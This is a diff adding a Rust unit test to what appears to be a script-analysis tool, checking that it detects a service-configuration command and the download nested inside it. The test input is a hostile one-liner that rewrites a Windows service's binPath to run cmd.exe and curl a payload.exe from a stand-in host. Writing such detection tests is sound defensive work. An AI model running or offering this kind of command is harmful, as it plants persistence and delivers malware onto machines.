@@ -32656,6 +32656,33 @@ mod service_install_tests {
             report.traits
         );
     }
+
+    #[test]
+    fn sc_config_binpath_cmd_child_is_analyzed() {
+        let script = br#"sc config UpdateSvc binPath= "cmd.exe /V:ON /c set U=https://sc-config-binpath.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ServiceInstall { service_name, bin_path }
+                    if service_name == "UpdateSvc"
+                        && bin_path.contains("cmd.exe /V:ON /c set U=")
+            )),
+            "service config trait missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://sc-config-binpath.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "service config binPath child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
